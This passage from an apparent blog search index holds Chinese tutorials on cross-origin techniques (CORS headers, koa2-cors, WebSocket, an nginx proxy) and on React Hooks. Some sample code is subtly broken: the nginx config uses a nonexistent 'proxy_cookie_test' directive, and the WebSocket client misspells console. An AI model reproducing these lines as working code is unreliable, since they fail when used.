class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>server.js<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> server = http.createServer();</span><br><span class="line"></span><br><span class="line">server.on(<span class="string">'request'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">    <span class="string">'Access-Control-Allow-Credentials'</span>: <span class="string">'true'</span>,     <span class="comment">// 后端允许发送Cookie</span></span><br><span class="line">    <span class="string">'Access-Control-Allow-Origin'</span>: <span class="string">'https://mfaying.github.io'</span>,    <span class="comment">// 允许访问的域（协议+域名+端口）</span></span><br><span class="line">    <span class="string">'Set-Cookie'</span>: <span class="string">'key=1;Path=/;Domain=mfaying.github.io;HttpOnly'</span>   <span class="comment">// HttpOnly:脚本无法读取cookie</span></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  res.write(<span class="built_in">JSON</span>.stringify(req.method));</span><br><span class="line">  res.end();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.listen(<span class="string">'8080'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Server is running at port 8080...'</span>);</span><br></pre></td></tr></table></figure></p>
<h2 id="koa结合koa2-cors中间件实现"><a href="#koa结合koa2-cors中间件实现" class="headerlink" title="koa结合koa2-cors中间件实现"></a>koa结合koa2-cors中间件实现</h2><p>示例代码：<a href="https://github.com/mfaying/lesson/tree/master/cross-origin/koa-cors" target="_blank" rel="noopener">https://github.com/mfaying/lesson/tree/master/cross-origin/koa-cors</a><br>演示网址：<a href="https://mfaying.github.io/lesson/cross-origin/koa-cors/index.html" target="_blank" rel="noopener">https://mfaying.github.io/lesson/cross-origin/koa-cors/index.html</a> (访问前需要先执行node server.js命令启动本地服务器)</p>
<p>index.html<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span></span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">"https://code.jquery.com/jquery-3.4.1.min.js"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">integrity</span>=<span class="string">"sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="</span></span></span><br><span class="line"><span class="tag">    <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $.<span class="keyword">get</span>('http://localhost:8080', function (data) &#123;</span></span><br><span class="line">      alert(data);</span><br><span class="line">    &#125;);</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>server.js<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> koa = <span class="built_in">require</span>(<span class="string">'koa'</span>);</span><br><span class="line"><span class="keyword">var</span> router = <span class="built_in">require</span>(<span class="string">'koa-router'</span>)();</span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">'koa2-cors'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> koa();</span><br><span class="line"></span><br><span class="line">app.use(cors(&#123;</span><br><span class="line">  origin: <span class="function"><span class="keyword">function</span> (<span class="params">ctx</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ctx.url === <span class="string">'/test'</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'*'</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  exposeHeaders: [<span class="string">'WWW-Authenticate'</span>, <span class="string">'Server-Authorization'</span>],</span><br><span class="line">  maxAge: <span class="number">5</span>,</span><br><span class="line">  credentials: <span class="literal">true</span>,</span><br><span class="line">  allowMethods: [<span class="string">'GET'</span>, <span class="string">'POST'</span>, <span class="string">'DELETE'</span>],</span><br><span class="line">  allowHeaders: [<span class="string">'Content-Type'</span>, <span class="string">'Authorization'</span>, <span class="string">'Accept'</span>],</span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/'</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params">ctx</span>) </span>&#123;</span><br><span class="line">  ctx.body = <span class="string">"0"</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">  .use(router.routes())</span><br><span class="line">  .use(router.allowedMethods());</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'server is listening in port 3000'</span>);</span><br></pre></td></tr></table></figure></p>
<h1 id="七、WebSocket协议跨域"><a href="#七、WebSocket协议跨域" class="headerlink" title="七、WebSocket协议跨域"></a>七、WebSocket协议跨域</h1><p>WebSocket协议是HTML5的新协议。能够实现浏览器与服务器全双工通信，同时允许跨域，是服务端推送技术的一种很好的实现。</p>
<p>示例代码：<a href="https://github.com/mfaying/lesson/tree/master/cross-origin/websocket" target="_blank" rel="noopener">https://github.com/mfaying/lesson/tree/master/cross-origin/websocket</a><br>演示网址：<a href="https://mfaying.github.io/lesson/cross-origin/websocket/index.html" target="_blank" rel="noopener">https://mfaying.github.io/lesson/cross-origin/websocket/index.html</a>(访问前需要先安装依赖包，再执行node server.js命令启动本地websocket服务端)</p>
<p>前端代码：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">'ws://localhost:8080/'</span>, <span class="string">'echo-protocol'</span>);</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 建立连接触发的事件</span></span></span><br><span class="line"><span class="javascript">    ws.onopen = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> data = &#123; <span class="string">"test"</span>: <span class="number">1</span> &#125;;</span></span><br><span class="line"><span class="javascript">      ws.send(<span class="built_in">JSON</span>.stringify(data));<span class="comment">// 可以给后台发送数据</span></span></span><br><span class="line">    &#125;;</span><br><span class="line"> </span><br><span class="line"><span class="javascript">    <span class="comment">// 接收到消息的回调方法</span></span></span><br><span class="line"><span class="javascript">    ws.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      alert(<span class="built_in">JSON</span>.parse(event.data).test);</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"><span class="javascript">    <span class="comment">// 断开连接触发的事件</span></span></span><br><span class="line"><span class="javascript">    ws.onclose = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      conosle.log(<span class="string">'close'</span>);</span></span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>server.js<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> WebSocketServer = <span class="built_in">require</span>(<span class="string">'websocket'</span>).server;</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> server = http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">request, response</span>) </span>&#123;</span><br><span class="line">  response.writeHead(<span class="number">404</span>);</span><br><span class="line">  response.end();</span><br><span class="line">&#125;);</span><br><span class="line">server.listen(<span class="number">8080</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Server is listening on port 8080'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">wsServer = <span class="keyword">new</span> WebSocketServer(&#123;</span><br><span class="line">    httpServer: server,</span><br><span class="line">    autoAcceptConnections: <span class="literal">false</span></span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">originIsAllowed</span>(<span class="params">origin</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">wsServer.on(<span class="string">'request'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">request</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!originIsAllowed(request.origin)) &#123;</span><br><span class="line">      request.reject();</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'Connection from origin '</span> + request.origin + <span class="string">' rejected.'</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> connection = request.accept(<span class="string">'echo-protocol'</span>, request.origin);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Connection accepted.'</span>);</span><br><span class="line">    connection.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (message.type === <span class="string">'utf8'</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> reqData = <span class="built_in">JSON</span>.parse(message.utf8Data);</span><br><span class="line">        reqData.test -= <span class="number">1</span>;</span><br><span class="line">        connection.sendUTF(<span class="built_in">JSON</span>.stringify(reqData));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    connection.on(<span class="string">'close'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'close'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<h1 id="八、nginx代理跨域"><a href="#八、nginx代理跨域" class="headerlink" title="八、nginx代理跨域"></a>八、nginx代理跨域</h1><p>原理：同源策略是浏览器的安全策略，不是HTTP协议的一部分。服务器端调用HTTP接口只是使用HTTP协议，不存在跨越问题。</p>
<p>实现：通过nginx配置代理服务器（域名与test1相同，端口不同）做跳板机，反向代理访问test2接口，且可以修改cookie中test信息，方便当前域cookie写入，实现跨域登录。</p>
<p>nginx具体配置：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#proxy服务器</span><br><span class="line">server &#123;</span><br><span class="line">    listen       81;</span><br><span class="line">    server_name  www.test1.com;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass   http://www.test2.com:8080;  #反向代理</span><br><span class="line">        proxy_cookie_test www.test2.com www.test1.com; #修改cookie里域名</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line"></span><br><span class="line">        add_header Access-Control-Allow-Origin http://www.test1.com;  #当前端只跨域不带cookie时，可为*</span><br><span class="line">        add_header Access-Control-Allow-Credentials true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>跨域</tag>
      </tags>
  </entry>
  <entry>
    <title>react知识汇总</title>
    <url>/2019/10/14/react%E7%9F%A5%E8%AF%86%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<h1 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="什么是Hook"><a href="#什么是Hook" class="headerlink" title="什么是Hook?"></a>什么是Hook?</h3><p>Hook是一些可以让你在函数组件里“钩入”React state及生命周期等特性的函数。</p>
<h3 id="使用Hook的原因"><a href="#使用Hook的原因" class="headerlink" title="使用Hook的原因"></a>使用Hook的原因</h3><ol>
<li>在组件之间复用状态逻辑很难<br>React没有提供将可复用性行为“附加”到组件的途经，以前一般是通过render props和高阶组件解决的。这类方案需要重新组织你的组件结构，这可能会很麻烦。</li>
<li>复杂组件变得难以理解<br>组件被状态逻辑和副作用充斥。每个生命周期常常包含一些不相关的逻辑。同一个 componentDidMount中可能也包含很多其它的逻辑，如设置事件监听，而之后需在 componentWillUnmount中清除。相互关联且需要对照修改的代码被进行了拆分，而完全不相关的代码却在同一个方法中组合在一起。<br>Hook 将组件中相互关联的部分拆分成更小的函数（比如设置订阅或请求数据），而并非强制按照生命周期划分。你还可以使用 reducer 来管理组件的内部状态，使其更加可预测。</li>
<li>难以理解的class<br>你必须去理解JavaScript中this的工作方式，这与其他语言存在巨大差异。还不能忘记绑定事件处理器。class也给目前的工具带来了一些问题。例如，class 不能很好的压缩，并且会使热重载出现不稳定的情况。</li>
</ol>
<h2 id="使用State-Hook"><a href="#使用State-Hook" class="headerlink" title="使用State Hook"></a>使用State Hook</h2><h3 id="计数器的例子"><a href="#计数器的例子" class="headerlink" title="计数器的例子"></a>计数器的例子</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; useState &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Example</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = useState(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;p&gt;You clicked &#123;count&#125; times&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">      &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;</span></span><br><span class="line"><span class="regexp">        Click me</span></span><br><span class="line"><span class="regexp">      &lt;/</span>button&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure>
<p>声明了一个叫count的state 变量，然后把它设为0。React会在重复渲染时记住它当前的值，并且提供最新的值给我们的函数。我们可以通过调用setCount来更新当前的count。</p>
<h3 id="使用Effect-Hook"><a href="#使用Effect-Hook" class="headerlink" title="使用Effect Hook"></a>使用Effect Hook</h3><p>Effect Hook可以让你在函数组件中执行副作用操作<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; useState, useEffect &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Example</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = useState(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Similar to componentDidMount and componentDidUpdate:</span></span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// Update the document title using the browser API</span></span><br><span class="line">    <span class="built_in">document</span>.title = <span class="string">`You clicked <span class="subst">$&#123;count&#125;</span> times`</span>;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;p&gt;You clicked &#123;count&#125; times&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">      &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;</span></span><br><span class="line"><span class="regexp">        Click me</span></span><br><span class="line"><span class="regexp">      &lt;/</span>button&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>你可以把useEffect Hook看做componentDidMount，componentDidUpdate和 componentWillUnmount这三个函数的组合。</p>
<p>你可能会注意到，传递给useEffect的函数在每次渲染中都可以在effect中获取最新的count的值。每次重新渲染，其实都会生成新的effect，替换掉之前的。某种意义上讲，effect更像是渲染结果的一部分——每个effect“属于”一次特定的渲染。</p>
<p>与componentDidMount或componentDidUpdate 不同，使用useEffect调度的effect不会阻塞浏览器更新屏幕，这让你的应用看起来响应更快。大多数情况下，effect不需要同步地执行。在个别情况下（例如测量布局），有单独的useLayoutEffect Hook供你使用，其API与 useEffect相同。</p>
<h3 id="需要清除的effect"><a href="#需要清除的effect" class="headerlink" title="需要清除的effect"></a>需要清除的effect</h3><p>如果你的effect返回一个函数，React会在组件卸载的时候调用它：<br><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; useState, useEffect &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FriendStatus</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [isOnline, setIsOnline] = useState(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">handleStatusChange</span>(<span class="params">status</span>) </span>&#123;</span><br><span class="line">      setIsOnline(status.isOnline);</span><br><span class="line">    &#125;</span><br><span class="line">    ChatAPI.subscribeToFriendStatus(props.friend.id, handleStatusChange);</span><br><span class="line">    <span class="comment">// Specify how to clean up after this effect:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      ChatAPI.unsubscribeFromFriendStatus(props.friend.id, handleStatusChange);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isOnline === <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Loading...'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> isOnline ? <span class="string">'Online'</span> : <span class="string">'Offline'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>注意，并不是必须为effect中返回的函数命名。其实也可以返回一个箭头函数或者给起一个别的名字。</p>
<h3 id="使用多个Effect实现关注点分离"><a href="#使用多个Effect实现关注点分离" class="headerlink" title="使用多个Effect实现关注点分离"></a>使用多个Effect实现关注点分离</h3><p>你也可以使用多个effect。这会将不相关逻辑分离到不同的effect中：<br><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FriendStatusWithCounter</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = useState(<span class="number">0</span>);</span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">document</span>.title = <span class="string">`You clicked <span class="subst">$&#123;count&#125;</span> times`</span>;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> [isOnline, setIsOnline] = useState(<span class="literal">null</span>);</span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">handleStatusChange</span>(<span class="params">status</span>) </span>&#123;</span><br><span class="line">      setIsOnline(status.isOnline);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ChatAPI.subscribeToFriendStatus(props.friend.id, handleStatusChange);</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      ChatAPI.unsubscribeFromFriendStatus(props.friend.id, handleStatusChange);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>React将按照effect声明的顺序依次调用组件中的每一个effect。</p>
<h3 id="通过跳过Effect进行性能优化"><a href="#通过跳过Effect进行性能优化" class="headerlink" title="通过跳过Effect进行性能优化"></a>通过跳过Effect进行性能优化</h3><p>如果某些特定值在两次重渲染之间没有发生变化，你可以通知React跳过对effect的调用，只要传递数组作为useEffect的第二个可选参数即可：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">document</span>.title = <span class="string">`You clicked <span class="subst">$&#123;count&#125;</span> times`</span>;</span><br><span class="line">&#125;, [count]); <span class="comment">// 仅在 count 更改时更新</span></span><br></pre></td></tr></table></figure></p>
<p>如果数组中有多个元素，即使只有一个元素发生变化，React也会执行effect。<br>请确保数组中包含了所有外部作用域中会随时间变化并且在effect中使用的变量。<br>如果想执行只运行一次的effect（仅在组件挂载和卸载时执行），可以传递一个空数组（[]）</p>
<h2 id="Hook规则"><a href="#Hook规则" class="headerlink" title="Hook规则"></a>Hook规则</h2><ol>
<li>只在最顶层使用 Hook，不要在循环，条件或嵌套函数中调用Hook。遵守这条规则，你就能确保Hook在每一次渲染中都按照同样的顺序被调用。这让React能够在多次的useState和 useEffect调用之间保持hook状态的正确。</li>
<li>不要在普通的JavaScript函数中调用Hook<br>你可以：<br>1.在React的函数组件中调用Hook<br>2.在自定义Hook中调用其他Hook<h2 id="自定义Hook"><a href="#自定义Hook" class="headerlink" title="自定义Hook"></a>自定义Hook</h2>自定义Hook是一个函数，其名称以“use”开头，函数内部可以调用其他的Hook。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useState, useEffect &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">useFriendStatus</span>(<span class="params">friendID</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [isOnline, setIsOnline] = useState(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">handleStatusChange</span>(<span class="params">status</span>) </span>&#123;</span><br><span class="line">      setIsOnline(status.isOnline);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ChatAPI.subscribeToFriendStatus(friendID, handleStatusChange);</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      ChatAPI.unsubscribeFromFriendStatus(friendID, handleStatusChange);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> isOnline;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>使用<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FriendStatus</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> isOnline = useFriendStatus(props.friend.id);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isOnline === <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Loading...'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> isOnline ? <span class="string">'Online'</span> : <span class="string">'Offline'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FriendListItem</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> isOnline = useFriendStatus(props.friend.id);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;li style=&#123;&#123; <span class="attr">color</span>: isOnline ? <span class="string">'green'</span> : <span class="string">'black'</span> &#125;&#125;&gt;</span><br><span class="line">      &#123;props.friend.name&#125;</span><br><span class="line">    &lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure>
<p>自定义Hook是一种自然遵循Hook设计的约定，而并不是React的特性。</p>
<h2 id="Hook-API索引"><a href="#Hook-API索引" class="headerlink" title="Hook API索引"></a>Hook API索引</h2><h3 id="useState补充"><a href="#useState补充" class="headerlink" title="useState补充"></a>useState补充</h3><ol>
<li><p>函数式更新</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">setCount(<span class="function"><span class="params">prevCount</span> =&gt;</span> prevCount - <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>惰性初始state<br>如果初始state需要通过复杂计算获得，则可以传入一个函数，在函数中计算并返回初始的 state，此函数只在初始渲染时被调用：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> [state, setState] = useState(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> initialState = someExpensiveComputation(props);</span><br><span class="line">  <span class="keyword">return</span> initialState;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>跳过state更新<br>调用State Hook的更新函数并传入当前的state时，React将跳过子组件的渲染及effect的执行。（React使用Object.is比较算法来比较state。）</p>
<h3 id="useEffect补充"><a href="#useEffect补充" class="headerlink" title="useEffect补充"></a>useEffect补充</h3><p>effect的执行时机<br>useEffect会在浏览器绘制后延迟执行，但会保证在任何新的渲染前执行。React将在组件更新前刷新上一轮渲染的effect。</p>
<h3 id="useContext"><a href="#useContext" class="headerlink" title="useContext"></a>useContext</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> value = useContext(MyContext);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>接收一个context对象（React.createContext的返回值）并返回该context的当前值。当前的context值由上层组件中距离当前组件最近的 <code>&lt;MyContext.Provider&gt;</code> 的value prop 决定。</p>
<p>当组件上层最近的<code>&lt;MyContext.Provider&gt;</code>更新时，该Hook会触发重渲染，并使用最新传递给MyContext provider的context value值。即使祖先使用React.memo或shouldComponentUpdate，也会在组件本身使用useContext时重新渲染。</p>
<h3 id="useReducer"><a href="#useReducer" class="headerlink" title="useReducer"></a>useReducer</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> [state, dispatch] = useReducer(reducer, initialArg, init);</span><br></pre></td></tr></table></figure>
<p>以下是用reducer重写useState一节的计数器示例：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> initialState = &#123;<span class="attr">count</span>: <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reducer</span>(<span class="params">state, action</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> (action.type) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'increment'</span>:</span><br><span class="line">      <span class="keyword">return</span> &#123;<span class="attr">count</span>: state.count + <span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'decrement'</span>:</span><br><span class="line">      <span class="keyword">return</span> &#123;<span class="attr">count</span>: state.count - <span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span 